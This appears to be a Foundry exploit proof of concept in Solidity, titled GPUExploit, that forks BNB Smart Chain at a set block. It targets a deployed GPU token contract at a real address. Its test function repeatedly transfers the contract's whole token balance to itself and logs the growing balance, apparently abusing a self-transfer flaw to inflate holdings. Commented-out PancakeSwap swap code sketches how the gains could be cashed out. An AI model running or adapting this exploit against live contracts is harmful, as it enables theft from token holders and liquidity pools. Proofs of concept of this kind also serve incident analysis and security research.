// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IWBNB.sol";
import "@interface/IPancakeV2.sol";

IERC20 constant gpuToken = IERC20(
    address(0xf51CBf9F8E089Ca48e454EB79731037a405972ce)
);
IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);

IPancakePairV2 constant USDT_BNB_V2_Pool = IPancakePairV2(
    0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE
);
IPancakeRouterV2 constant PancakeV2Router = IPancakeRouterV2(
    payable(0x10ED43C718714eb63d5aA57B78B54704E256024E)
);

contract GPUExploit is Test {
    uint32 swapFeeTotal = 10000;
    uint32 swapFeeBase = 25;

    function setUp() external {
        vm.createSelectFork("bsc", 38_539_572);
        deal(address(gpuToken), address(this), 1000000);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        // address[] memory path = new address[](2);
        // path[0] = address(USDT);
        // path[1] = address(gpuToken);

        // uint256 amountOut = PancakeV2Router.getAmountsOut(amount0, path)[1];
        // PancakeV2Router.swapExactTokensForTokens(
        //     amount0, // amountIn
        //     amountOut,
        //     path,
        //     address(this),
        //     block.timestamp
        // );

        for (int i = 0; i < 10; i++) {
            console.log(gpuToken.balanceOf(address(this)));
            gpuToken.transfer(address(this), gpuToken.balanceOf(address(this)));
        }
    }
}
